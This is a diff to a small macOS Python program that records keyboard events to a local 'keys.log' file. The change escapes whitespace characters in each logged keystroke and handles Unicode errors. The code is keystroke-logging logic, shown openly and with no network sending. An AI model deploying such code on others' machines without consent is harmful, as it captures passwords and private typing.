@@ -15,14 +15,16 @@ class AppDelegate(NSObject):
  
 def handler(event):
     try:
-        #NSLog(u"%@", event)
+        # logging.info(str(event))
+        logging.info(str(event).replace('\r', '<RETURN>').replace('\n', '<NEWLINE>').replace('\t', '<TAB>').replace('\" \"', '\"<SPACE>\"'))
+    except UnicodeEncodeError as e:
+	# logging.info(event.encode('ascii', 'xmlcharrefreplace'))
         logging.info(event)
     except KeyboardInterrupt:
         AppHelper.stopEventLoop()
  
 def main():
     app = NSApplication.sharedApplication()
-    #logging.basicConfig(filename='../data/keys.log', format='%(asctime)s %(message)s %(app)s', level=logging.INFO)
     logging.basicConfig(filename='../data/keys.log', format='%(asctime)s %(message)s', level=logging.INFO)
     delegate = AppDelegate.alloc().init()
     NSApp().setDelegate_(delegate)
